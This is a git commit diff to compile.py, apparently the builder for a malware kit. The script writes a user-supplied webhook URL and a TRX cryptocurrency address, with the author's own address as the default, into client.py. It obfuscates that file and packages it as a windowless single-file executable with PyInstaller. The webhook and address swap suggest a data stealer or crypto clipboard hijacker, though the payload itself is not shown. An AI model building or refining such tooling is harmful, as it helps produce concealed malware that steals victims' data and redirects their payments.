b330272c6419469909f211178b77edeee83c2925
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-20 01:06:37 +0200

    Update compile.py

--- compile.py
+++ compile.py
@@ -6,9 +6,11 @@ import pyImpossibleObf
 
 key ="loooood"
 webhook = input("Webhook : ")
-
+trxaddress = input("TRX Address (enter for default, and support me btw) :")
+if trxaddress == "":
+	trxaddress = "TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d"
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", webhook)
+filecontent = filecontent.replace("webhook667", webhook).replace("TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d", "TRX:" + trxaddress )
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
@@ -16,4 +18,4 @@ val = input("Do you use py, python or python3 filename.py to launch file? (py/py
 
 os.system(val + " hash.py")
 
-os.system(val + ' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
+os.system('pyinstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
